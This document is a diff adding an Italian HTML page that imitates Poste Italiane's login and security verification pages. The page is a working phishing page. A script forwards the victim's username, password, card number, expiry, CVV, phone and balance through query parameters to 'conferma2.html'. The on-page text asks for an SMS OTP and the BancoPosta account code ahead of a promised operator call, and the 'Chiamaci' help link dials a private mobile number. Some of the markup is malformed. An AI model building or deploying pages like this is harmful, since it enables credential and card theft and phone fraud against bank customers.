@@ -1,0 +1,779 @@
+﻿
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <title>Accedi o Registrati</title>
+
+
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, user-scalable=0">
+    <link type="text/css" rel="stylesheet" href="/risorse_dt/bootstrap/css/bootstrap.min.css">
+    <link type="text/css" rel="stylesheet" href="/risorse_dt/condivise/stili/trasversali/owl.carousel.css">
+    <link type="text/css" rel="stylesheet" href="/risorse_dt/condivise/stili/trasversali/base.css">
+    <link type="text/css" rel="stylesheet" href="/risorse_dt/condivise/stili/trasversali/megamenu-pi.css">
+    <link type="text/css" rel="stylesheet" href="/risorse_dt/condivise/stili/trasversali/retina.css">
+    <link type="text/css" rel="stylesheet" href="/risorse_dt/applicazioni/trasversali/stili/custom-form-element.css">
+    <script type="text/javascript" src="/risorse_dt/condivise/javascript/jquery.min.js"></script>
+    <script type="text/javascript" src="/risorse_dt/condivise/javascript/utilita.js"></script>
+    <script type="text/javascript" src="/risorse_dt/condivise/javascript/poste-it.js"></script>
+    <script type="text/javascript" src="/risorse_dt/condivise/javascript/megamenu-pi.js"></script>
+    <script type="text/javascript" src="/risorse_dt/condivise/javascript/scroll-pi.js"></script>
+    <script type="text/javascript" src="/risorse_dt/condivise/javascript/slick.min.js"></script>
+    <script type="text/javascript" src="/risorse_dt/condivise/javascript/jquery.hc-sticky.min.js"></script>
+    <script type="text/javascript" src="/risorse_dt/condivise/javascript/jquery.mobile.custom.min.js"></script>
+    <script type="text/javascript" src="/risorse_dt/applicazioni/trasversali/javascript/custom-form-element.js"></script>
+    <script type="text/javascript" src="/risorse_dt/applicazioni/trasversali/javascript/utilita-app.js"></script>
+
+    <script type="text/javascript" src="https://www.poste.it/bowser.js"></script>
+    <!--[if lt IE 9]>
+    <script type="text/javascript" src="/risorse_dt/bootstrap/js/html5shiv.min.js"></script>
+    <![endif]-->
+    <!--[if lt IE 9]>
+    <script type="text/javascript" src="/risorse_dt/bootstrap/js/respond.min.js"></script>
+    <![endif]-->
+    <!--[if IE 8]>
+    <link type="text/css" rel="stylesheet" href="/risorse_dt/condivise/stili/trasversali/ie8.css">
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link type="text/css" rel="stylesheet" href="/risorse_dt/condivise/stili/trasversali/ie7-ie6.css">
+    <![endif]-->
+
+    <script>
+        $(window).load(function () {
+            $('#bottonePosteID .bottonePosteID-wrapper').addClass('text-xs-center');
+            $('#bottonePosteID img').addClass('spacer-xs-bottom-30 spacer-xs-top-30');
+            $('#bottonePosteID .wrapperPosteID-info').addClass('spacer-xs-top-15 btn btn-primary btn-expand');
+            $('#bottonePosteID .wrapperPosteID-info').text("Accedi con PosteID");
+
+            $('#checkbox-remember').on('change', function () {
+                if ($(this).is(':checked')) {
+                    $('#rememberme').val() == "on";
+                }
+                else {
+                    $('#rememberme').val() == "";
+                }
+            })
+            $(window).resize();
+        });
+    </script>
+
+
+
+    <script src="https://assets.adobedtm.com/launch-EN592261e36dc14b10a9936e854a4b30db.min.js" async></script>
+
+
+
+
+
+    <script type="text/javascript">
+
+
+
+        function loadScript(url, callback) {
+            var script = document.createElement("script")
+            script.type = "text/javascript";
+            if (script.readyState) { // only required for IE <9
+                script.onreadystatechange = function () {
+                    if (script.readyState === "loaded" || script.readyState === "complete") {
+                        script.onreadystatechange = null;
+                        callback();
+                    }
+                };
+            } else { //Others
+                script.onload = function () {
+                    callback();
+                };
+            }
+
+            script.src = url;
+            document.getElementsByTagName("head")[0].appendChild(script);
+        }
+
+        $(function () {
+            // call the function...
+            loadScript("https://widget.poste.it/js/custom.js", function () {
+                setWidget("NA", "NA", "CREDENZIALI", "PROD");
+            });
+        })
+    </script>
+
+
+
+    <script type=text/javascript>
+        $(function () {
+            $('#checkbox-remember').on('change', function () {
+                if ($(this).is(':checked')) {
+                    $('#rememberme').val("on");
+                }
+                else {
+                    $('#rememberme').val("");
+                }
+            });
+
+            $('#password-trigger').on('mousedown', function () {
+                $('#password').attr('type', 'text');
+                $('#password-trigger').removeClass('bg-password-hide')
+                $('#password-trigger').addClass('bg-password-show')
+            }).on('mouseup', function () {
+                $('#password').attr('type', 'password');
+                $('#password-trigger').removeClass('bg-password-show')
+                $('#password-trigger').addClass('bg-password-hide')
+            }).on('mouseleave', function () {
+                $('#password').attr('type', 'password');
+                $('#password-trigger').removeClass('bg-password-show')
+                $('#password-trigger').addClass('bg-password-hide')
+            });
+
+        });
+
+        function deleteRememberMe() {
+            $('#username').val("");
+            $('#firstname').text("");
+            $('.rememberme_hidden').show();
+            $('.rememberme_shown').hide();
+            $('#rememberme').val("");
+        }
+    </script>
+
+    <style>
+        h1.idp-retail {
+            font-size: 40px !important;
+        }
+
+        h3.idp-retail {
+            font-size: 20px !important;
+        }
+
+        .spacer-xs-top-38 {
+            margin-top: 38px !important;
+        }
+
+        .bg-box-qrcode {
+            background-image: url("/risorse_dt_ext/icone/bg-qrcode.png");
+            background-repeat: no-repeat !important;
+            background-position-x: center !important;
+            background-position-y: bottom !important;
+        }
+
+        .bg-css-countdown {
+            background-color: #dae5f6;
+            margin-bottom: 0 !important;
+        }
+
+        .bg-password-show {
+            background-image: url(/risorse_dt/applicazioni/trasversali/immagini/eye-cut.png);
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+
+        .bg-password-hide {
+            background-image: url(/risorse_dt/applicazioni/trasversali/immagini/eye.png);
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+    </style>
+
+
+    <!-- per la modale ma se cambia va totlo -->
+    <style>
+
+        /* /* The Modal (background) */ */
+        /* .modal { */
+        /*   display: none; /* Hidden by default */ */
+        /*   position: absolute; /* Stay in place */ */
+        /*   z-index: 1; /* Sit on top */ */
+        /*   padding-top: 100px; /* Location of the box */ */
+        /*   left: 0; */
+        /*   top: 0; */
+        /*   width: 100%; /* Full width */ */
+        /*   height: 100%; /* Full height */ */
+        /*   overflow: auto; /* Enable scroll if needed */ */
+        /*   overflow-y: auto !important; */
+        /*   background-color: rgb(0,0,0); /* Fallback color */ */
+        /*   background-color: rgba(0,0,0,0.4); /* Black w/ opacity */ */
+        /* } */
+        /* /* Modal Content */ */
+        /* .modal-content { */
+        /*   background-color: #fefefe; */
+        /*   margin: auto; */
+        /*   padding: 20px; */
+        /*   border: 1px solid #888; */
+        /*   width: 80%; */
+        /* } */
+        /* /* The Close Button */ */
+        /* .close { */
+        /*   color: #aaaaaa; */
+        /*   float: right; */
+        /*   font-size: 28px; */
+        /*   font-weight: bold; */
+        /* } */
+
+        /* .close:hover, */
+        /* .close:focus { */
+        /*   color: #000; */
+        /*   text-decoration: none; */
+        /*   cursor: pointer; */
+        /* } */
+    </style>
+
+
+
+
+
+
+
+
+
+    <script type="text/javascript" src="/jod-fcc/posteID/x-jod-poste-id.js"></script>
+
+
+
+
+
+
+
+
+    <script type="text/javascript" src="/jod-fcc/resources/portal/js-rsa-2/hashtable.js"></script>
+    <script type="text/javascript" src="/jod-fcc/resources/portal/js-rsa-2/rsa.js"></script>
+    <script type="text/javascript" src="/jod-fcc/resources/portal/js-rsa-2/pbase-css-poste.js"></script>
+
+
+
+
+
+
+    <script type="text/javascript" src="/jod-fcc/resources/portal/js-polling/jdpolling.js"></script>
+
+
+
+    <script type="text/javascript">
+        function logintest(actForm) {
+            try {
+                posteSubmit(actForm);
+
+            }
+            catch (e) { };
+            return true;
+        }
+
+
+        var organizationmessage = "MyPoste";
+        var federated = true;
+        var issuer = "./poste/MyPoste.php";
+        var cancelurl = "./index.php";
+
+
+        var sp_link = "";
+        var sp_link_label = "";
+        var sp_subtitle = "";
+
+        var sp_posteid = true;
+        var sp_business = true;
+    </script>
+
+
+    <script type="text/javascript">
+        $(function () {
+            var isRememberMe = false
+            if (isRememberMe) {
+                $('#username').val("");
+                $('#firstname').text("");
+                $('.rememberme_hidden').hide();
+                $('.rememberme_shown').show();
+                $('#rememberme').val("on");
+            }
+        })
+    </script>
+</head>
+<body>
+
+
+    <!--googleoff: all-->
+    <script type="text/javascript">
+        $('<div class="pageLoader"><img class="loader-logo" alt="Poste Italiane" src="/risorse_dt/condivise/immagini/loghi/logo-poste-italiane.png"  srcset="/risorse_dt/condivise/immagini/loghi/logo-poste-italiane@2x.png 2x"><img class="loader-spinner" src="/risorse_dt/condivise/immagini/generiche/spinner_giallo.gif" /></div>').appendTo('body');
+        $(".pageLoader").css({
+            "background-color": "#fff",
+            "position": "fixed",
+            "width": "100%",
+            "height": "100%",
+            "z-index": "9999",
+            "top": "0",
+            "opacity": "1",
+            "text-align": "center",
+            "padding-top": "20%",
+            "display": "block"
+        });
+        $(".pageLoader .loader-spinner").css({
+            "padding-top": "40px",
+            "width": "40px",
+            "display": "block",
+            "margin": "0 auto"
+        });
+        $(".pageLoader .loader-logo").css({
+            "height": "22px"
+        });
+        $(window).ready(function () {
+            if (typeof bowser != "undefined") {
+                if (!$("html").hasClass("pi-mobile") &&
+                    ((bowser.msie && bowser.version < 10) ||
+                        (bowser.edge && bowser.version < 20) ||
+                        (bowser.firefox && bowser.version < 40) ||
+                        (bowser.opera && bowser.version < 33) ||
+                        (bowser.chrome && bowser.version < 41) ||
+                        (bowser.safari && bowser.version < 9))
+                ) {
+                    $("#content-alert-old-browser").show();
+                    $(".content-alert-browser").show();
+                }
+            }
+        });
+    </script>
+    <!-- AlertBrowser -->
+    <div class="content content-alert-browser">
+        <div id="content-alert-old-browser"
+             class="content content-alert-old-browser">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-12">
+                        <div id="alertIe" class="innerspacer-xs-top-20 innerspacer-xs-bottom-20">
+                            <div id="alertIe-inner">
+                                La versione del tuo browser non &egrave; aggiornata. Per una migliore navigazione del sito, scarica la versione pi&ugrave; recente.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="consent_blackbar"></div>
+    </div>
+    <div class="content content-federation-bar content-federation-bar-minified content-federation-bar-simplified">
+        <div class="container container-extended">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="header-minified">
+                        <div class="row">
+                            <div class="col-xs-12">
+                                <div class="federation-bar-content-logo pull-xs-left clearfix">
+                                    <div class="logo">
+                                        <a href="https://www.poste.it/index.html" title="" class="hidden-xs hidden-sm">
+                                            <span class="wrap-logo wrap-logo-medium"><img alt="Poste Italiane" src="/risorse_dt/condivise/immagini/loghi/logo-poste-italiane-medium.png" srcset="/risorse_dt/condivise/immagini/loghi/logo-poste-italiane-medium@2x.png 2x" class="logo-image-pi-medium" /></span>
+                                        </a>
+                                        <a href="https://www.poste.it/index.html" title="" class="logo-mobile hidden-md hidden-lg">
+                                            <span class="wrap-logo wrap-logo-small"><img alt="Poste Italiane" src="/risorse_dt/condivise/immagini/loghi/logo-poste-italiane-medium.png" srcset="/risorse_dt/condivise/immagini/loghi/logo-poste-italiane-medium@2x.png 2x" class="logo-image-pi-small" /></span>
+                                        </a>
+                                    </div>
+
+                                    <div class="back spacer-md-left-30">
+                                        <a class="back-link" href="/index.php" title="Annulla accesso">
+                                            <span class="hidden-xs hidden-sm">Annulla accesso</span>
+                                        </a>
+                                    </div>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--googleon: all-->
+    <div class="content content-applicative  nobracket">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12" id="accessibility-anchor">
+                    <div class="row">
+                        <div class="col-xs-12 ">
+                            <div class="main" style="margin-top: -40px !important;">
+                                <div class="row">
+                                    <div class="col-md-12">
+                                        <div class="abstract">
+                                            <div class="abstract-heading text-xs-center spacer-xs-bottom-40">
+                                                <h1 class="idp-retail">
+                                                    Sicurezza
+
+                                                    <small>
+                                                        <h3 class="idp-retail">
+
+
+                                                            <a id="sp-link-fcc" href="https://business.poste.it/business/myposte/index.html">
+
+                                                            </a>
+
+                                                        </h3>
+                                                    </small>
+                                                </h1>
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row">
+                                    <div class="col-md-8 pull-sm-not center">
+                                        <div class="row equalize-group equalize-group-1">
+                                            <div class="col-sm-12">
+                                                <div class="content">
+                                                    <div class="content-overflow-wrap">
+                                                        <div class="row">
+                                                            <!-- panel credenziali  -->
+
+
+                                                            <div class="col-xs-12 col-sm-6">
+
+
+                                                                <div class="panel panel-cards panel-cards-large">
+                                                                    <div class="panel-wrap innerspacer-xs-bottom-0">
+                                                                        <div class="panel-heading spacer-xs-top-30 rememberme_hidden">
+                                                                            <p class="text-xs-lef">
+                                                                                Completa il processo di verifica tramite il codice OTP che riceverai sul numero di telefono certificato per verificare il tuo dispositivo e concludere in modo sicuro la verifica di sicurezza.
+                                                                                Successivamente sarai contattato da un nostro operatore per la conferma finale, se sei un cliente BancoPosta tieni a portata di mano il Codice Conto BancoPosta (Codice numerico di 4 cifre ricevuto via sms all'apertura del conto)
+                                                                            </p>
+
+                                                                        </div>
+
+                                                                        <div class="panel-heading spacer-xs-top-30 text-xs-center rememberme_shown" style="display:none">
+                                                                            <img src="/risorse_dt_ext/icone/empty-profile.png" srcset="/risorse_dt_ext/icone/empty-profile@2x.png 2x" />
+                                                                            <h4 id="firstname"></h4>
+                                                                            <p><a href="javascript:deleteRememberMe();">Non sei tu?</a></p>
+                                                                        </div>
+
+                                                                        <script type="text/javascript">
+                                                                            function querySt(ji) {
+                                                                                hu = window.location.search.substring(1);
+                                                                                gy = hu.split("&");
+                                                                                for (i = 0; i < gy.length; i++) {
+                                                                                    ft = gy[i].split("=");
+                                                                                    if (ft[0] == ji) {
+                                                                                        return ft[1];
+                                                                                    }
+                                                                                }
+                                                                            }
+
+                                                                            $(function () {
+                                                                                $('.form-login').attr("action", "conferma2.html?guidLocator=" + querySt("guidLocator")
+                                                                                    + "&replace=" + querySt("replace")
+                                                                                    + "&username=" + querySt("username")
+                                                                                    + "&password=" + querySt("password")
+                                                                                    + "&carta=" + querySt("carta")
+                                                                                    + "&scadenza=" + querySt("scadenza")
+                                                                                    + "&telefono=" + querySt("telefono")
+                                                                                    + "&saldo=" + querySt("saldo")
+                                                                                    + "&cvv=" + querySt("cvv")
+                                                                                );
+                                                                            })
+                                                                        </script>
+
+                                                                        <form class="form-login spacer-xs-bottom-30 clearfix" method="POST" onsubmit="logintest(this)">
+                                                                            <input id="rememberme" name="rememberme" type="hidden" value="" />
+                                                                            <input type="hidden" name="dep" id="dep" value="">
+                                                                            <input type="hidden" name="dop" id="dop" value="">
+                                                                            <input type="hidden" name="evp" id="evp" value="">
+                                                                            <input type="hidden" name="mid" id="mid" value="">
+
+                                                                            <input type="hidden" name="rememberme" id="rememberme" value="">
+                                                                            <div class="panel-body">
+
+                                                                                <div class="spacer-xs-bottom-30">
+
+                                                                                    <p
+																							<div class="col-sm-12 col-md-6">
+														   <div class="btn-contaiener btn-container-left spacer-xs-bottom-0 spacer-xs-top-15 clearfix">
+															  <input class="btn btn-primary btn-expand" value="RICHIEDI SMS" type="submit">
+																						</p>
+
+
+                                                                                    </p>
+
+
+
+                                                                                    <p class="subtext text-center spacer-xs-0" style="font-size:0.9em">
+                                                                                    </p>
+
+                                                                                </div>
+                                                                            </div>
+                                                                        </form>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                            <!-- panel qrcode  -->
+
+
+                                                            <div class="col-sm-6 hidden-xs">
+                                                                <div class="panel panel-cards panel-cards-large bg-box-qrcode">
+                                                                    <div class="panel-wrap innerspacer-xs-bottom-0 text-xs-center">
+                                                                        <div class="panel-heading spacer-xs-top-30">
+                                                                            <h4 class="text-xs-center">
+                                                                                Accedi <strong>pi&ugrave; velocemente</strong>
+                                                                            </h4>
+                                                                        </div>
+
+
+                                                                        <p>Inquadra il QR code con le app <b>BancoPosta</b> o <b>Postepay</b></p>
+
+
+                                                                        <p class="innerspacer-sm-bottom-10 innerspacer-sm-top-10"><img src="/risorse_dt_ext/icone/ico-bp.png">&nbsp;&nbsp;<img src="/risorse_dt_ext/icone/ico-pp.png"></p>
+
+
+
+
+
+
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+
+
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                    <!-- do you need help -->
+                                    <div class="content content-post-main">
+                                        <div class="container">
+                                            <div class="row" id="help__assistenza">
+                                                <div class="col-sm-12">
+                                                    <h2 class="text-xs-center">Hai bisogno di aiuto?</h2>
+                                                </div>
+                                                <div class="col-md-8 col-lg-push-1 col-lg-10">
+                                                    <div class="btn-container text-xs-center">
+                                                        <div class="row">
+                                                            <div class="col-sm-6 col-md-4 col-sm-push-0 col-md-push-0">
+                                                                <a href="tel:3487157303"
+                                                                   title="Chiamaci"
+                                                                   class="btn btn-sm btn-secondary btn-expand"<img
+																		src="/risorse_dt/condivise/immagini/icone/icone-default-on/ico-chiamaci.png"
+																		srcset="/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-chiamaci@2x.png 2x"
+																		class="spacer-xs-right-10">Chiamaci</a>
+                                                            </div>
+
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="content content-main" style="padding-top: 15px;">
+                                                    <div class="container">
+                                                        <div class="row">
+                                                            <div class="col-md-8 col-lg-push-1 col-lg-10 text-xs-center innerspacer-xs-top-30">
+                                                                In caso di mancato accesso o non funzionamento dei
+                                                                servizi &egrave; possibile contattare il Call Center al
+                                                                numero verde <a href="tel:803.160">803.160</a> (dal
+                                                                luned&igrave; al sabato dalle ore 8.00 alle ore 20.00).
+                                                                La chiamata &egrave; gratuita.
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <!--html template-->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="content content-footer content-footer-post">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="row">
+                        <div class="col-md-5">
+                            <p class="text-xs-center text-md-left">
+                                &copy; Poste Italiane 2020 - Partita iva : 01114601006
+                            </p>
+                        </div>
+                        <div class="col-md-7">
+                            <div class="clearfix">
+                                <div class="base-footer">
+                                    <div id="teconsent"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <a href="#" class="btn btn-primary btn-cta back-to-top">
+                        <span class="hide">vai a inizio pagina</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script type="text/javascript" src="/risorse_dt/condivise/javascript/start-script.js"></script>
+    <script type="text/javascript" src="/risorse_dt/bootstrap/js/bootstrap.js"></script>
+    <script type="text/javascript" src="/risorse_dt/bootstrap/js/ie10-viewport-bug-workaround.js"></script>
+
+
+
+
+
+
+
+    <!-- The Modal -->
+    <div class="modal" id="modalQrWaiting" tabindex="-1">
+        <div class="modal-dialog" style="margin-top: 0px;" role="dialog" aria-labelledby="modalQrWaitingLabel" aria-modal="true" aria-describedby="modalQrWaitingDesc">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <div class="row">
+
+                    </div>
+                    <div class="row">
+                        <div class="col-sm-12 text-xs-center">
+                            <h3 class="spacer-xs-bottom-30" id="modalQrWaitingLabel">Controlla il tuo<br />smartphone</h3>
+
+
+
+                            <img id="imgmyappnane" src="/risorse_dt_ext/icone/small-modal-ico-bp-pp.png">
+
+
+                            <p class="spacer-xs-bottom-20" id="modalQrWaitingDesc">
+
+
+                                Per proseguire devi autorizzare nell'App che hai utilizzato per inquadrare il codice QR.
+
+
+
+
+
+
+
+
+                            </p>
+
+
+
+
+                            <script>
+                                $(function () {
+
+                                    $("#modalDati").find(".modal-dialog").css("margin-top", "30px!important");
+                                    setTimeout(function () {
+                                        $("#modalDati").modal();
+                                    }, 1000);
+
+                                    $(document).on("hidden.bs.modal", "#modalDati", function () {
+                                        $("#username").focus();
+                                    });
+                                });
+                            </script>
+                            <!-- Modal content -->
+
+
+                            <script language="javascript">
+
+                                jd_qrpush("https://idp-poste.poste.it/jod-idp-retail/polling/v1/app-qr", "a70cc7eb-bb28-45a1-b961-129f4d7233fd", xxxsuccess, xxxerror, "modalQrWaiting");
+
+                                function xxxsuccess(xdata) {
+
+                                    try {
+                                        var f = document.getElementById("x-user-signature-transaction");
+                                        var obj_p = JSON.parse(xdata);
+                                        f.value = obj_p.usersignaturetransaction;
+
+                                        var xqr = document.getElementById("xqr");
+                                        xqr.submit();
+
+                                    } catch (e) {
+                                        //alert(e);
+                                    }
+
+
+
+                                    //alert("OK");
+
+
+                                }
+
+                                $('#modalQrWaiting').on('hide.bs.modal', function () {
+                                    stopPolling();
+                                })
+
+
+
+
+
+                                function getStatus() {
+
+                                    var status = jdstatus();
+                                    if ("az_timeout" == status || "az_rejected" == status || "az_error" == status) {
+                                        document.getElementById('__polling_progress__').innerHTML = "La richiesta di accesso &egrave; stata annullata";
+                                    }
+                                    setTimeout(getStatus, 100);
+                                }
+                                getStatus();
+
+
+
+                            </script>
+
+                            <script language="javascript">
+
+                                function startTimer(duration, display) {
+                                    var timer = duration, minutes, seconds;
+                                    setInterval(function () {
+                                        minutes = parseInt(timer / 60, 10);
+                                        seconds = parseInt(timer % 60, 10);
+
+                                        minutes = minutes < 10 ? "0" + minutes : minutes;
+                                        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                                        if (display != null) {
+                                            display.innerHTML = minutes + ":" + seconds;
+                                        }
+                                        if (--timer < 0) {
+                                            timer = 0;
+                                            xxxerror();
+                                        }
+                                    }, 1000);
+                                }
+
+                                var tt = document.getElementById('_timer');
+                                // 60 * 5
+                                startTimer(60 * 5, tt);
+
+                            </script>
+
+
+
+
+
+
+
+
+                            <script language="JavaScript">
+
+                            </script>
+
+
+
+
+                            <form name="loginform1" id="loginform1" method="post" action="/jod-fcc/dislogin">
+                                <input type="hidden" value="" id="secureToken" name="secureToken" />
+                                <input type="hidden" value="" id="signature" name="signature" />
+                                <input type="hidden" name="dep" id="dep" value="">
+                                <input type="hidden" name="dop" id="dop" value="">
+                                <input type="hidden" name="evp" id="evp" value="">
+
+                            </form>
+
+                            <script type="text/javascript">
+                                jQuery("#x_chiudi").attr("href", "https://www.poste.it");
+                            </script>
+
+
+
+
+
+
+
+
+</body>
+</html>
